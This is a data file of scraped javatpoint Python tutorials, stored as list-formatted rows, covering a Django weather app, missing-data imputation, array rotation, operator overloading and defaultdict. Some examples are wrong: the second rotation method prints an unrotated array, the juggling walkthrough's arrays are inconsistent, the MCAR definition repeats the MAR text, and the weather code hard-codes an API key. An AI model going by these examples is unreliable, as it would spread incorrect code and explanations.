home(request):', ""if request.method == 'POST':"", '# Get the city name from the user api = http://api.openweathermap.org/data/2.5/weather', ""city = request.POST.get('city', 'True')"", '', '# retreive the information using api', ""source = urllib.request.urlopen('http://api.openweathermap.org/data/2.5/weather?q=' + city + '&units=imperial&appid=164fec96a27b97680ee442e489ce3f06').read()"", '', '# convert json data file into python dictionary', 'list_of_data = json.loads(source)', '# create dictionary and convert value in string', 'context = {', ""'city': city,"", '""country_code"": str(list_of_data[\'sys\'][\'country\']),', '""coordinate"": str(list_of_data[\'coord\'][\'lon\']) + \' \'', ""+ str(list_of_data['coord']['lat']),"", '""temp"": str(list_of_data[\'main\'][\'temp\']) + \'k\',', '""pressure"": str(list_of_data[\'main\'][\'pressure\']),', '""humidity"": str(list_of_data[\'main\'][\'humidity\']),', '}', 'else:', 'context = {}', '# send dictionary to the index.html', ""return render(request, 'index.html', context)"", '<div class=""row"">', '{% if country_code and coordinate and temp and pressure and humidity %}', '<div class=""col d-flex justify-content-center"" "">', '<div class="" card text-white bg-light mb-6"">', '<div class="" card-body"">', '<h4><span class=""badge badge-primary"">City :</span> {{city}}</h4>', '<h4><span class=""badge badge-primary"">Country Code :</span> {{country_code}}</h4>', '<h4><span class=""badge badge-primary"">Coordinates [X,Y] :</span> {{coordinate}}</h4>', '<h4><span class=""badge badge-primary"">Temperature :</span> {{temp}}</h4>', '<h4><span class=""badge badge-primary"">Pressure :</span> {{pressure}} </h4>', '<h4><span class=""badge badge-primary"">Humidity : </span> {{humidity}}</h4>', '</div>', '{% endif %}', '</div>']",[],[],"['|||Familiar with Python|||Familiar with fundamentals of Django|||The system should have installed Python|||Install IDE (Pycharm, VSCode, Atom, Sublime)||||||Using pipenv shell command|||Using venv|||']"
305,['Missing Data Conundrum: Exploration and Imputation Techniques'],"['Missing data is a most common and non-negotiable problem in statistical analysis and machine learning. They affect the data quality. It can happen due to various reasons such as the user not responding to questions in a recommender system, death of the patient on treatment or non-compliance, and so on.']","['https://www.javatpoint.com/different-methods-of-array-rotation-in-python', 'https://www.javatpoint.com/weather-app-in-django', 'https://www.javatpoint.com/different-methods-of-array-rotation-in-python', 'https://www.javatpoint.com/weather-app-in-django', 'https://www.javatpoint.com/different-methods-of-array-rotation-in-python']",['https://static.javatpoint.com/python/images/missing-data-conundrum-exploration-and-imputation-techniques.png'],[],"['Fancyimpute Module', 'Multiple Imputations by Chained Equation', 'Handling Missing Data', 'Conclusion']","['Missing Data Mechanism', 'K-Nearest Neighbor', 'Case Deletion']",[],"['In this tutorial, we will discuss the importance of missing data and identify the reason for the missing data.', 'Missing Completely at Random (MCAR)', 'Missing at Random (MAR)', 'Missing Not at Random (MNAR)', 'There are many modules that can handle the missing data effectively, but the fancyimpute module is quite useful and popular.', 'Missing data plays an important role creating a predictive model; algorithms do not perform very well with missing dataset.', ""KNN finds out similar data points among all the features and fill out the missing value. Let's understand the following example."", ""Let's create a dummy dataset which contains some missing values using pandas dataframe."", 'Example - 1', 'Example - 2:', 'Example - 2', 'Example - 3']","['The mechanism of missing data can be categorized into three major classes. These categories are based on the nature of the missing data and observed data. These mechanisms are given below.', 'The nature of the missing data is related to the observed data but not the missing data. For example - Children are missing their classes because their parents are moving to a different city and hence, the children had to leave the study.', 'The nature of the missing data is related to the observed data but not the missing data. For example - Children are missing their classes because their parents moving to a different city and hence, the children had to leave the study.', 'Understanding the data collection process and substantive scientific knowledge helps to assume a data mechanism. Statistical testing also helps to understand the type of missing data mechanism.', ""In this method, mice use the multiple imputations instead of single imputation. It performs multiple regressions over the sample data and takes averages of them. Let's understand the following example."", ""In the above code, we have created the new dataset that contains missing values. We can remove the missing values using the df.dropna() method that removes all the missing value. Let's see the below output."", ""We can also use the df.dropna(how = 'all') which removes just the rows with the missing values. We can also specify removing a column with the missing values using df.dropna(axis = 1, how = 'all'). Let's understand the below example.""]","['In the current era, Data is treated as fuel means data is a most powerful thing. It can be used in many ways. But the incomplete data can lead to a problem. So first, we need to understand the importance of the data, and more importantly, we need to identify the reason for missing data occurrence comprehensively. The data collection process also plays an important role to identify the data collection errors.', 'It is also known as non-ignorable because the missingness mechanism cannot be ignored. It can happen only when there are neither MCAR nor MAR. The missing value on the variable are related to that both of the observed and unobserved variables. For example - Parent refuses to send their children to study center due to the toxic atmosphere and they do not want to their children bullied. The problem with the MNAR data is intrinsically associated with the issue of identifiability.', 'Fancyimpute is a machine learning library for the missing data imputation algorithm. It uses a machine-learning algorithm to impute missing values. Fancyimpute uses the entire column to impute the missing values. It provides the two ways to impute the missing data', ""There are many methods available to treat the missing data in the literature, textbook and standard courses. We have discussed one of the important methods as a fancyimputer. However, these methods consist of some drawbacks. When using the data mining process, one need to be careful to avoid bias or overestimate variability; these methods don't perform well."", 'There are two types of case deletion methods. The first one is a list deletion (also known as complete case analysis) and second method is the pair deletion. The case deletion methods are used to delete the missing cases from our dataset on an analysis-by-analysis basis.', 'In this tutorial, we have discussed the importance of missing data in data science projects. It reviews exploration techniques and important imputation methods used for handling missing data. We have also described the method of handling the missing value. A wildly used model assumes a joint distribution of all the missing values and estimates the model parameters describing the observed data.']","['import pandas as pd', 'import numpy as np', '# importing the KNN from fancyimpute library', 'from fancyimpute import KNN', 'df = pd.DataFrame([[np.nan, 1, np.nan, 0],', '[2, 7, np.nan, 1],', '[np.nan, np.nan, np.nan, 5],', '[np.nan, 8, np.nan, 4],', '[9,  7, 8,   2],', '[2,  5, 7,   9]],', ""columns = list('ABCD'))"", '# printing the dataframe', 'print(df)', '# calling the KNN class', 'knn_imputer = KNN()', '# imputing the missing value with knn imputer', 'df = knn_imputer.fit_transform(df)', '# printing dataframe', 'print(df)', 'import pandas as pd', 'import numpy as np', '# importing the MICE from fancyimpute library', 'from fancyimpute import IterativeImputer', 'df = pd.DataFrame([[np.nan, 15, 1, np.nan],', '[23, 40, np.nan, 1],', '[np.nan, np.nan, np.nan, 5],', '[np.nan, 3, np.nan, 4],', '[15,   70, 28,   29],', '[20,   35, 57,   91]],', ""columns = list('ABCD'))"", '# printing the dataframe', 'print(df)', '# calling the MICE class', 'mice_imputer = IterativeImputer()', '# imputing the missing value with mice imputer', 'df = mice_imputer.fit_transform(df)', '# printing dataframe', 'print(df)', 'import pandas as pd', 'import numpy as np', 'import fancyimpute', 'from sklearn.impute import SimpleImputer', ""data = {'Name': ['John','Paul', np.NaN, 'Wale', 'Mary', 'Carli', 'Steve'], 'Age': [21,23,np.nan,19,25,np.nan,15],'Sex': ['M',np.nan,np.nan,'M','F','F','M'],'Goals': [5,10,np.nan,19,5,0,7],'Assists': [7,4,np.nan,9,7,6,4],'Value': [55,84,np.nan,90,63,15,46]}"", ""df=pd.DataFrame(data, columns =['Name','Age','Sex','Goals', 'Assists', 'Value'])"", 'print(df)', 'import pandas as pd', 'import numpy as np', 'import fancyimpute', 'from sklearn.impute import SimpleImputer', ""data = {'Name': ['John','Paul', np.NaN, 'Wale', 'Mary', 'Carli', 'Steve'], 'Age': [21,23,np.nan,19,25,np.nan,15],'Sex': ['M',np.nan,np.nan,'M','F','F','M'],'Goals': [5,10,np.nan,19,5,0,7],'Assists': [7,4,np.nan,9,7,6,4],'Value': [55,84,np.nan,90,63,15,46]}"", ""df=pd.DataFrame(data, columns =['Name','Age','Sex','Goals', 'Assists', 'Value'])"", 'print(df.dropna())', 'import pandas as pd', 'import numpy as np', 'import fancyimpute', 'from sklearn.impute import SimpleImputer', ""data = {'Name': ['John','Paul', np.NaN, 'Wale', 'Mary', 'Carli', 'Steve'], 'Age': [21,23,np.nan,19,25,np.nan,15],'Sex': ['M',np.nan,np.nan,'M','F','F','M'],'Goals': [5,10,np.nan,19,5,0,7],'Assists': [7,4,np.nan,9,7,6,4],'Value': [55,84,np.nan,90,63,15,46]}"", ""df=pd.DataFrame(data, columns =['Name','Age','Sex','Goals', 'Assists', 'Value'])"", ""print(df.dropna(how = 'all'))"", 'import pandas as pd', 'import numpy as np', 'import fancyimpute', 'from sklearn.impute import SimpleImputer', ""data = {'Name': ['John','Paul', np.NaN, 'Wale', 'Mary', 'Carli', 'Steve'], 'Age': [21,23,np.nan,19,25,np.nan,15],'Sex': ['M',np.nan,np.nan,'M','F','F','M'],'Goals': [5,10,np.nan,19,5,0,7],'Assists': [7,4,np.nan,9,7,6,4],'Value': [55,84,np.nan,90,63,15,46]}"", ""df=pd.DataFrame(data, columns =['Name','Age','Sex','Goals', 'Assists', 'Value'])"", ""print(df.dropna(axis=1, how='all'))""]","['A    B    C  D', '0  NaN  1.0  NaN  0', '1  2.0  7.0  NaN  1', '2  NaN  NaN  NaN  5', '3  NaN  8.0  NaN  4', '4  9.0  7.0  8.0  2', '5  2.0  5.0  7.0  9', 'Imputing row 1/6 with 2 missing, elapsed time: 0.001', '[[4.80735271 1.         7.70802941 0.        ]', '[2.         7.         7.57627146 1.        ]', '[5.29411783 7.49760549 7.64000033 5.        ]', '[6.2499999  8.         7.87179494 4.        ]', '[9.         7.         8.         2.        ]', '[2.         5.         7.         9.        ]]', 'A     B     C     D', '0   NaN  15.0   1.0   NaN', '1  23.0  40.0   NaN   1.0', '2   NaN   NaN   NaN   5.0', '3   NaN   3.0   NaN   4.0', '4  15.0  70.0  28.0  29.0', '5  20.0  35.0  57.0  91.0', '[[ 32.13508529  15.           1.         -76.25883183]', '[ 23.          40.          23.80426163   1.        ]', '[ 24.47759791  32.58430591  26.67745156   5.        ]', '[ 31.14858991   3.          32.06817994   4.        ]', '[ 15.          70.          28.          29.        ]', '[ 20.          35.          57.          91.        ]]', 'Name   Age  Sex  Goals  Assists  Value', '0   John  21.0    M    5.0      7.0   55.0', '1   Paul  23.0  NaN   10.0      4.0   84.0', '2    NaN   NaN  NaN    NaN      NaN    NaN', '3   Wale  19.0    M   19.0      9.0   90.0', '4   Mary  25.0    F    5.0      7.0   63.0', '5  Carli   NaN    F    0.0      6.0   15.0', '6  Steve  15.0    M    7.0      4.0   46.0', 'Name   Age Sex  Goals  Assists  Value', '0   John  21.0   M    5.0      7.0   55.0', '3   Wale  19.0   M   19.0      9.0   90.0', '4   Mary  25.0   F    5.0      7.0   63.0', '6  Steve  15.0   M    7.0      4.0   46.0', 'Name   Age  Sex  Goals  Assists  Value', '0   John  21.0    M    5.0      7.0   55.0', '1   Paul  23.0  NaN   10.0      4.0   84.0', '3   Wale  19.0    M   19.0      9.0   90.0', '4   Mary  25.0    F    5.0      7.0   63.0', '5  Carli   NaN    F    0.0      6.0   15.0', '6  Steve  15.0    M    7.0      4.0   46.0', 'Name   Age  Sex  Goals  Assists  Value', '0   John  21.0    M    5.0      7.0   55.0', '1   Paul  23.0  NaN   10.0      4.0   84.0', '2    NaN   NaN  NaN    NaN      NaN    NaN', '3   Wale  19.0    M   19.0      9.0   90.0', '4   Mary  25.0    F    5.0      7.0   63.0', '5  Carli   NaN    F    0.0      6.0   15.0', '6  Steve  15.0    M    7.0      4.0   46.0']",[],['|||KNN or K-Nearest Neighbor|||MICE or Multiple Imputation by Chained Equation|||']
306,['Different Methods of Array Rotation in Python'],"['In this tutorial, we will learn how we can rotate the array using the Python program. We will write a function for rotation (arry[], E, K) which will be used for rotating arry[] of size K = 8 by E = 4 elements. ']","['https://www.javatpoint.com/what-is-operator-overloading-in-python', 'https://www.javatpoint.com/missing-data-conundrum-exploration-and-imputation-techniques', 'https://www.javatpoint.com/what-is-operator-overloading-in-python', 'https://www.javatpoint.com/missing-data-conundrum-exploration-and-imputation-techniques', 'https://www.javatpoint.com/what-is-operator-overloading-in-python']","['https://static.javatpoint.com/python/images/different-methods-of-array-rotation-in-python.png', 'https://static.javatpoint.com/python/images/different-methods-of-array-rotation-in-python2.png', 'https://static.javatpoint.com/python/images/different-methods-of-array-rotation-in-python3.png']",[],"['Methods for Array Rotation:', 'Conclusion']","['Method 1: By using temp array', 'Method 2: By rotation elements one by one', 'Method 3: By using a Juggling Algorithm', 'Method 4: By using List Slicing']",[],"['We will get the following the array after rotating array by 4 elements:', 'In this session, we will discuss different methods users can use for rotation the array according to their requirements.', 'In this method, we will use the following approach:', 'Step 1: We will store ""E"" elements in a temp array', 'Temp[] = [1, 3, 5, 7]', 'Step 2: we will shift the rest of the arry[]', 'arry[] = [9, 11, 13, 15]', 'Step 3: We will store the ""E"" elements', 'arry[] = [9, 11, 13, 15, 1, 3, 5, 7]', 'In the above method:', 'In this method, we will use the following approach:', 'rotate_array1(arry[], E, K)', 'In the above method:', 'In this method, we will be dividing the array into different sets instead of moving elements one by one.', 'When the number of sets is equal to the greatest common divider of ""K"" and ""E"", the code will mode the elements into the sets.', ""Let's see an example in which, K = 16 and E = 4. Greatest Common Divider (G_C_D) = 4"", 'After completion of this set, arry[] will be equal to [15, 12, 13, 14, 19, 16, 17, 18, 23, 20, 21, 22, 11, 23, 24, 25, 26]', 'In the above method:', 'In this method, we will use list slicing for rotating the elements of an array.', 'If we want to rotate the array by more than its length, we can use the mod method.', 'In this article, we have discussed how we can use different methods for rotating the given array by using Python.']","['We have to store arry[0] for rotating elements by one in a temporary variable, ""temp_1"". Then we will more arry[1] to arry[0], arry[2] to arry[1] and so on. At last, we will have temp_1 on arry[n-1].', 'If the greatest common divider is equal to 1, then the elements will move into one set only. Here, we will start with temp_1 = arry[0], and it will keep moving arry[J + E] to arry[J], and at last, it will store the temp_1 at the right place.', 'Suppose the array that we want to rotate by ""E"" is of ""K"" size and ""E"" is greater than ""K"". In this case, we have to calculate (E%K) and then we can rotate by the output after mod calculation.']",[],"['Input arry[] = [1, 3, 5, 7, 9, 11, 13, 15], E = 4, N = 8', 'def rotate_array1(arry, K, E):', 'temp_1 = []', 'J = 0', 'while (J < E):', 'temp_1.append(arry[J])', 'J = J + 1', 'J = 0', 'while (E < K):', 'arry[J] = arry[E]', 'J = J + 1', 'E = E + 1', 'arry[:] = arry[: J] + temp_1', 'return arry', '# Driver function to test above function', 'arry = [1, 3, 5, 7, 9, 11, 13, 15]', 'print (""Array after Rotation by 4 elements is: "", end = \' \')', 'print (rotate_array1(arry, len(arry), 4))', 'Time Complexity: O(K)                      [K = size of array]', 'Auxiliary Space: O(E)                         [E = number of elements to be rotated]', 'def rotate_array1(arry, K, E):', 'for J in range(E):', 'rotate_by_one(arry, K)', '#Now, we will define a function to rotate arry[] of size K by 1', 'def rotate_by_one(arry, K):', 'temp_1 = arry[0]', 'for J in range(K - 1):', 'arry[J] = arry[J + 1]', 'arry[K - 1] = temp_1', '', '# Then, we will define a utility function for printing an array', 'def print_array(arry, size_1):', 'for J in range(size_1):', 'print (""%d"" % arry[J], end = "" "")', '# At last, we will write a driver program for testing the above functions', 'arry = [1, 3, 5, 7, 9, 11, 13, 15]', 'rotate_array1(arry, 4, 8)', 'print (""The array after rotation: "")', 'print_array(arry, 8)', 'Time Complexity: O(K * E)                      [K = size of array]', '[E = number of elements to be rotated]', 'Auxiliary Space: O(1)', 'arry[] = [11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26]', 'def rotate_array1(arry, K, E):', 'for J in range(G_C_D(E, K)):', '', '# now, we will move the J-th values of blocks', 'temp_1 = arry[J]', 'S = J', 'while 1:', 'F = S + E', 'if F >= K:', 'F = F - K', 'if F == J:', 'break', 'arry[S] = arry[F]', 'S = F', 'arry[S] = temp_1', '# Then, we will define a utility function for printing an array', 'def print_array(arry, size_1):', 'for J in range(size_1):', 'print (""%d"" % arry[J], end = "" "")', '#Here, we will define a Function for getting G_C_D of Sets', 'def G_C_D(X, Y):', 'if Y == 0:', 'return X;', 'else:', 'return G_C_D(Y, X % Y)', '# Driver program to test above functions', 'arry = [11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26]', 'rotate_array1(arry, 4, 16)', 'print (""The array after rotation: "")', 'print_array(arry, 16)', 'Time Complexity: O(K )                      [K = size of array]', 'Auxiliary Space: O(1)', 'def rotate_List1(arry, E, K):', 'arry[:] = arry[E:K] + arry[0:E]', 'return arry', '# We will write a driver program for testing the above functions', 'arry = [11, 12, 13, 14, 15, 16, 17, 18]', 'print (""The List is: "", arry)', 'print (""The rotated list is: "")', 'print (rotate_List1(arry, 4, len(arry)))']","['Array after Rotation by 4 elements is: [9, 11, 13, 15, 1, 3, 5, 7]', 'The array after rotation:', '1 3 5 7 9 11 13 15', 'The array after rotation:', '[15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 11, 12, 13, 14]', 'The List is: [11, 12, 13, 14, 15, 16, 17, 18]', 'The rotated list is:', '[15, 16, 17, 18, 11, 12, 13, 14]']",[],"['|||we will put the ""for"" condition that if J is equal to 0 and less than E, then the rotate_array1 function will rotate all elements by one||||||At first, the elements will be moved into the first set - as shown in the following diagram:|||||||||Then in second set: arry will be [15, 16, 13, 14, 19, 20, 17, 18, 23, 24, 21, 22, 11, 12, 24, 25, 26]|||In the third set: arry will be [15, 16, 17, 14, 19, 20, 21, 18, 23, 24, 25, 11, 12, 13, 26]|||Finally, in the fourth set: arry will be [15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 11, 12, 13, 14]|||']"
307,['What is Operator Overloading in Python'],"['The operator overloading in Python means provide extended meaning beyond their predefined operational meaning. Such as, we use the ""+"" operator for adding two integers as well as joining two strings or merging two lists. We can achieve this as the ""+"" operator is overloaded by the ""int"" class and ""str"" class. The user can notice that the same inbuilt operator or function is showing different behaviour for objects of different classes. This process is known as operator overloading.']","['https://www.javatpoint.com/nsetools-in-python', 'https://www.javatpoint.com/different-methods-of-array-rotation-in-python', 'https://www.javatpoint.com/nsetools-in-python', 'https://www.javatpoint.com/different-methods-of-array-rotation-in-python', 'https://www.javatpoint.com/nsetools-in-python']",[],[],"['How to Overload the Operators in Python?', 'How to Perform Binary ""+"" Operator in Python:', 'Python magic functions used for operator overloading:', 'Conclusion']","['Program 1: Simply adding two objects.', 'Program 2: defining Overloading operator in another object', 'Program 3: Overloading comparison operators in Python', 'Program 4: Overloading equality and less than operators', 'Binary Operators:', 'Comparison Operators:', 'Assignment Operators:', 'Unary Operator:']",[],"['Python program for simply using the overloading operator for adding two objects.', 'Python program for defining the overloading operator inside another object.', 'Python program for overloading comparison operators.', 'Python Program for overloading equality and less than operators:', 'In this tutorial, we have discussed overloading operators in Python and how to use them to perform various operators.']",[],"['Suppose the user has two objects which are the physical representation of a user-defined data type class. The user has to add two objects using the ""+"" operator, and it gives an error. This is because the compiler does not know how to add two objects. So, the user has to define the function for using the operator, and that process is known as ""operator overloading"". The user can overload all the existing operators by they cannot create any new operator. Python provides some special functions, or we can say magic functions for performing operator overloading, which is automatically invoked when it is associated with that operator. Such as, when the user uses the ""+"" operator, the magic function __add__ will automatically invoke in the command where the ""+"" operator will be defined.', 'When the user uses the operator on the user-defined data types of class, then a magic function that is associated with the operator will be invoked automatically. The process of changing the behaviour of the operator is as simple as the behaviour of the function or method defined.', 'The user define methods or functions in the class and the operator works according to that behaviour defined in the functions. When the user uses the ""+"" operator, it will change the code of a magic function, and the user has an extra meaning of the ""+"" operator.']","['print (14 + 32)', '# Now, we will concatenate the two strings', 'print (""Java"" + ""Tpoint"")', '# We will check the product of two numbers', 'print (23 * 14)', '# Here, we will try to repeat the String', 'print (""X Y Z "" * 3)', 'class example:', 'def __init__(self, X):', 'self.X = X', '# adding two objects', 'def __add__(self, U):', 'return self.X + U.X', 'object_1 = example( int( input( print (""Please enter the value: ""))))', 'object_2 = example( int( input( print (""Please enter the value: ""))))', 'print ("": "", object_1 + object_2)', 'object_3 = example(str( input( print (""Please enter the value: ""))))', 'object_4 = example(str( input( print (""Please enter the value: ""))))', 'print ("": "", object_3 + object_4)', 'class complex_1:', 'def __init__(self, X, Y):', 'self.X = X', 'self.Y = Y', '# Now, we will add the two objects', 'def __add__(self, U):', 'return self.X + U.X, self.Y + U.Y', 'Object_1 = complex_1(23, 12)', 'Object_2 = complex_1(21, 22)', 'Object_3 = Object_1 + Object_2', 'print (Object_3)', 'class example_1:', 'def __init__(self, X):', 'self.X = X', 'def __gt__(self, U):', 'if(self.X > U.X):', 'return True', 'else:', 'return False', 'object_1 = example_1(int( input( print (""Please enter the value: ""))))', 'object_2 = example_1(int (input( print(""Please enter the value: ""))))', 'if(object_1 > object_2):', 'print (""The object_1 is greater than object_2"")', 'print (""The object_2 is greater than object_1"")', 'class E_1:', 'def __init__(self, X):', 'self.X = X', 'def __lt__(self, U):', 'if(self.X < U.X):', 'return ""object_1 is less than object_2""', 'else:', 'return ""object_2 is less than object_1""', 'def __eq__(self, U):', 'if(self.X == U.X):', 'return ""Both the objects are equal""', 'else:', 'return ""Objects are not equal""', '', 'object_1 = E_1(int( input( print (""Please enter the value: ""))))', 'object_2 = E_1(int( input( print (""Please enter the value: ""))))', 'print ("": "", object_1 < object_2)', 'object_3 = E_1(int( input( print (""Please enter the value: ""))))', 'object_4 = E_1(int( input( print (""Please enter the value: ""))))', 'print ("": "", object_3 == object_4)']","['46', 'JavaTpoint', '322', 'X Y Z X Y Z X Y Z', 'Please enter the value: 23', 'Please enter the value: 21', ':  44', 'Please enter the value: Java', 'Please enter the value: Tpoint', ':  JavaTpoint', '(44, 34)', 'Please enter the value: 23', 'Please enter the value: 12', 'The object_1 is greater than object_2', 'Please enter the value: 20', 'Please enter the value: 31', 'The object_2 is greater than object_1', 'Please enter the value: 12', 'Please enter the value: 23', ':  object_1 is less than object_2', 'Please enter the value: 2', 'Please enter the value: 2', ':  Both the objects are equal', 'Please enter the value: 26', 'Please enter the value: 3', ': object_2 is less than object_1', 'Please enter the value: 2', 'Please enter the value: 5', ': Objects are not equal']","['Operator|||Magic Function&&&+|||__add__(self, other)&&&-|||__sub__(self, other)&&&*|||__mul__(self, other)&&&/|||__truediv__(self, other)&&&//|||__floordiv__(self, other)&&&%|||__mod__(self, other)&&&**|||__pow__(self, other)&&&>>|||__rshift__(self, other)&&&<<|||__lshift__(self, other)&&&&|||__and__(self, other)&&&||||__or__(self, other)&&&^|||__xor__(self, other)', 'Operator|||Magic Function&&&<|||__LT__(SELF, OTHER)&&&>|||__GT__(SELF, OTHER)&&&<=|||__LE__(SELF, OTHER)&&&>=|||__GE__(SELF, OTHER)&&&==|||__EQ__(SELF, OTHER)&&&!=|||__NE__(SELF, OTHER)', 'Operator|||Magic Function&&&-=|||__ISUB__(SELF, OTHER)&&&+=|||__IADD__(SELF, OTHER)&&&*=|||__IMUL__(SELF, OTHER)&&&/=|||__IDIV__(SELF, OTHER)&&&//=|||__IFLOORDIV__(SELF, OTHER)&&&%=|||__IMOD__(SELF, OTHER)&&&**=|||__IPOW__(SELF, OTHER)&&&>>=|||__IRSHIFT__(SELF, OTHER)&&&<<=|||__ILSHIFT__(SELF, OTHER)&&&&=|||__IAND__(SELF, OTHER)&&&|=|||__IOR__(SELF, OTHER)&&&^=|||__IXOR__(SELF, OTHER)', 'Operator|||Magic Function&&&-|||__NEG__(SELF, OTHER)&&&+|||__POS__(SELF, OTHER)&&&~|||__INVERT__(SELF, OTHER)']",[]
308,['Defaultdict in Python'],"['The dictionary is an unordered collection of data values in Python used for storing data values such as maps. The dictionary holds key-value pairs instead of holding a single value as an element like other data types. The key implemented in the dictionary must be unique and immutable. That is, the Python tuple can be a key, but the Python list cannot be a key in the dictionary. We can create a dictionary by placing a sequence of elements inside the curly brackets {}, a comma "","" can separate the values.']","['https://www.javatpoint.com/operator-module-in-python', 'https://www.javatpoint.com/second-largest-number-in-python', 'https://www.javatpoint.com/operator-module-in-python', 'https://www.javatpoint.com/second-largest-number-in-python', 'https://www.javatpoint.com/operator-module-in-python']",[],[],"['defaultdict', 'Conclusion']","['Example 1:', 'Example 2:', 'Inner Working of defaultdict', 'How to Use ""List"" as default_factory', 'How to Use ""int"" as default_factory']",[],"['But if we try to print the 5th key value then, we will get the error because ""Dict_1"" does not contain the 5th key value.', 'Parameters:', 'We can pass a list class as the default_factory argument, and it will create a defaultdict with the values that are set in list format.', 'We can pass the int class as the default_factory argument, and it will create a defaultdict with the default value set as zero.']","['When we use defaultdict, we get an additional writable instance variable and one method in addition to the standard dictionary operations. The writable instance variable is the default_factory parameter and __missing__ is the method.', 'In this tutorial, we have discussed defaultdict in Python and how we can perform different operations on defaultdict by using the default_factory parameter.']","[""Whenever the keyError is raised, it may become a problem for the users. We can overcome this error by using another dictionary of Python, which is like a container known as Defaultdict. The users can find this dictionary inside the 'collections' module."", ""The defaultdict is a dictionary of Python, which is like a container present inside the 'collections' module. It is a sub-class of the dictionary class which is used for returning the dictionary-like object. Both defaultdict and dictionary have the same functionality, except defaultdict never raise any KeyError as it provides a default value for the Key, which does not exist in the dictionary created by the user.""]","[""Dict_1 = {1: 'A', 2: 'B', 3: 'C', 4: 'D'}"", 'print (""Dictionary: "")', 'print (Dict_1)', 'print (""key pair 1: "", Dict_1[1])', 'print (""key pair 3: "", Dict_1[3])', ""Dict_1 = {1: 'A', 2: 'B', 3: 'C', 4: 'D'}"", 'print (""Dictionary: "")', 'print (Dict_1)', 'print (""key pair 5: "", Dict_1[5])', 'defaultdict(default_factory)', 'from collections import defaultdict as DD', '# Function for returning a default values for the', '# keys which are not present in the dictionary', 'def default_value():', 'return ""This key is not present""', '# Now, we will define the dict', 'dict_1 = DD(default_value)', 'dict_1[""ABC""] = 1', 'dict_1[""DEF""] = 2', 'dict_1[""GHI""] = 3', 'dict_1[""JKL""] = 4', 'print (""Dictionary: "")', 'print (dict_1)', 'print (""key pair 1: "", dict_1[""ABC""])', 'print (""key pair 3: "", dict_1[""GHI""])', 'print (""key pair 5: "", dict_1[""MNO""])', 'from collections import defaultdict as DD', 'dict_1 = DD(lambda: ""This key is not present"")', 'dict_1[""ABC""] = 1', 'dict_1[""DEF""] = 2', 'dict_1[""GHI""] = 3', 'dict_1[""JKL""] = 4', 'print (""Dictionary: "")', 'print (dict_1)', 'print (""key value 1: "", dict_1[""ABC""])', 'print (""key value 3: "", dict_1[""GHI""])', 'print (""key value 5: "", dict_1[""MNO""])', 'from collections import defaultdict as DD', 'dict_1 = DD(lambda: ""This key is not present"")', 'dict_1[""ABC""] = 1', 'dict_1[""DEF""] = 2', 'dict_1[""GHI""] = 3', 'dict_1[""JKL""] = 4', 'print (""Dictionary: "")', 'print (dict_1)', 'print (""key value 1: "", dict_1.__missing__(\'ABC\'))', 'print (""key value 4: "", dict_1[""JKL""])', 'print (""key value 5: "", dict_1.__missing__(\'MNO\'))', 'from collections import defaultdict as DD', '# Defining a dictionary', 'dict_1 = DD(list)', 'for k in range(7, 12):', 'dict_1[k].append(k)', 'print (""Dictionary with values as list:"")', 'print (dict_1)', 'from collections import defaultdict as DD', '# Defining the dict', 'dict_1 = DD(int)', 'J = [1, 2, 3, 4, 2, 4, 1, 2]', '# Now, we will iterate through the list ""J""', '# for keeping the count', 'for k in J:', '# As, The default value is 0', '# so we do not need to', '# enter the key first', 'dict_1[k] += 1', 'print(dict_1)']","['Dictionary:', ""{1: 'A', 2: 'B', 3: 'C', 4: 'D'}"", 'key pair 1: A', 'key pair 3: C', 'Dictionary:', ""{1: 'A', 2: 'B', 3: 'C', 4: 'D'}"", '---------------------------------------------------------------------------', 'KeyError                                  Traceback (most recent call last)', 'in', '2 print (""Dictionary: "")', '3 print (Dict_1)', '----> 4 print (""key pair 5: "", Dict_1[5])', 'KeyError: 5', 'Dictionary:', ""defaultdict(, {'ABC': 1, 'DEF': 2, 'GHI': 3, 'JKL': 4})"", 'key pair 1:  1', 'key pair 3:  3', 'key pair 5:  This key is not present', 'Dictionary:', ""defaultdict( at 0x0000019EFC4B58B0>, {'ABC': 1, 'DEF': 2, 'GHI': 3, 'JKL': 4})"", 'key value 1:  1', 'key value 3:  3', 'key value 5:  This key is not present', 'Dictionary:', ""defaultdict( at 0x0000019EFC4B5670>, {'ABC': 1, 'DEF': 2, 'GHI': 3, 'JKL': 4})"", 'key value 1:  This key is not present', 'key value 4:  4', 'key value 5:  This key is not present', 'Dictionary with values as list:', ""defaultdict(<class 'list'>, {7: [7], 8: [8], 9: [9], 10: [10], 11: [11]})"", ""defaultdict(<class 'int'>, {1: 2, 2: 3, 3: 1, 4: 2})""]",[],"['|||default_factory: The default_factory() function returns the default value set by the user for the dictionary defined by them. If this argument is absent, then the dictionary will raise the KeyError.||||||default_factory: The default_factory() function returns the default value set by the user for the dictionary defined by them.||||||__missing__(): The __missing__() function is used for providing the default value to the dictionary. The __missing__() function takes default_factory as an argument, and if the argument is set to None, a KeyError will raise; otherwise, it will provide a default value for the given key. This method is essentially called by the __getitem__() function of the dict class when the requested key is not found. The __getitem__() function raise or return the value which is present in the __missing__() function.|||']"
309,['Operator Module in Python'],"['In this tutorial, we will learn about the operator module in Python and its various functions. We will use these functions of the operator module in a Python program to demonstrate their work.']","['https://www.javatpoint.com/spinner-widget-in-kivy-library-of-python', 'https://www.javatpoint.com/defaultdict-in-python', 'https://www.javatpoint.com/spinner-widget-in-kivy-library-of-python', 'https://www.javatpoint.com/defaultdict-in-python', 'https://www.javatpoint.com/spinner-widget-in-kivy-library-of-python']",[],[],"['Python Operator Module', 'Conclusion']","['Mathematical Operation Functions:', 'Relational Operation Functions:']",[],"['1. add(x, y): We can use add(x, y) function of the operator module to add two input given numbers, whereas x and y are two input values.', 'Operator module performs ""x + y"" operation in this function.', 'Operator module performs ""x - y"" operation in this function.', '3. mul(x, y): We can use the mul(x, y) function to get the multiplication of two input given numbers, whereas x and y are two input values.', 'Operator module performs ""x * y"" operation in this function.', 'Operator module performs ""x / y"" operation in this function.', 'Operator module performs ""x // y"" operation in this function.', '6. mod(x, y): The mod(x, y) is used to get the modulus of two numbers by giving them as arguments inside the function.', 'Operator module performs ""x % y"" operation in this function.', '7. pow(x, y): To get the power value of a function, we use the pow(x, y) function where y is treated as the power of x.', 'Operator module performs ""x ** 